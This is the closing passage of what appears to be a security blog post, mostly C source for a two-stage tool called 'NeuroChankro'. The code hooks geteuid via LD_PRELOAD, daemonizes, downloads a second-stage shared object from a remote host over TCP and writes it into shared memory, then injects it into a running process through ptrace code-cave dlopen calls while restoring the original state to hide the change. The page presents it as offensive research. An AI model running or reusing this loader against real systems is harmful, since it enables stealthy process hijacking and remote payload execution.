    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Resuming the execution...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_CONT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">waitpidstatus</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">regs</span><span class="p">.</span><span class="n">rax</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: dlopen() call failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] It worked! Shared Object loaded at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">regs</span><span class="p">.</span><span class="n">rax</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// Now is time to restore everything to his original status :)</span>
        <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="n">oldcode</span><span class="p">,</span> <span class="n">CAVE_SIZE</span><span class="p">);</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Restore original status...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">oldcode</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Finished!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Downloader</span>
<span class="kt">void</span> <span class="nf">download</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">recvBuff</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">size</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serv_addr</span><span class="p">;</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="n">recvBuff</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">recvBuff</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: socket could not be created</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">));</span>
    <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">8880</span><span class="p">);</span>
        
    <span class="k">if</span> <span class="p">(</span><span class="n">inet_pton</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"DOUBLEC"</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: address is invalid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: connect failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">shm_open</span><span class="p">(</span><span class="n">SHM_NAME</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_CREAT</span><span class="p">,</span> <span class="n">S_IRWXU</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(;;)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">size</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">recvBuff</span><span class="p">,</span> <span class="mi">2048</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">recvBuff</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">daemonize</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">signal</span><span class="p">(</span><span class="n">SIGHUP</span><span class="p">,</span> <span class="n">SIG_IGN</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
                            <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"====[ NeuroChankro Stage 1 ]====</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="c1">// Check ptrace_scope</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Checking ptrace_scope... "</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">check_yama</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"value is 0</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"value is not 0. Exiting...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
   
    <span class="c1">// Download Stage 2</span>
    <span class="n">download</span><span class="p">();</span>
    <span class="c1">// Try to infect</span>
    <span class="n">infector</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">"NEUROCHANKRO"</span><span class="p">)));</span>    
<span class="p">}</span>

<span class="n">uid_t</span> <span class="nf">geteuid</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">uid_t</span> <span class="p">(</span><span class="o">*</span><span class="n">orig_geteuid</span><span class="p">)();</span>
  <span class="n">orig_geteuid</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">"geteuid"</span><span class="p">);</span>
  <span class="n">unsetenv</span><span class="p">(</span><span class="s">"LD_PRELOAD"</span><span class="p">);</span>
  <span class="n">daemonize</span><span class="p">();</span>
  <span class="n">pwn</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">orig_geteuid</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>
<p><strong>Stage 2</strong></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Stage 2 - Just log to know that everything worked </span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">alert_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">alert_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">chivato</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">chivato</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">chivato</span><span class="p">),</span> <span class="s">"PID: %d"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/tmp/chivato"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">);</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="n">chivato</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">chivato</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="final-words">Final words</h2>
<p>        
I wrote this article without time, so maybe I could make mistakes. Please ping me at twitter (<a href="https://twitter.com/TheXC3LL">@TheXC3LL</a>) if you find any mistake so I can correct it. Thank you!</p>





      </section>
      <footer>
        
        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
        
        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
      </footer>
    </div>
    <script src="/assets/js/scale.fix.js"></script>
  </body>
</html>
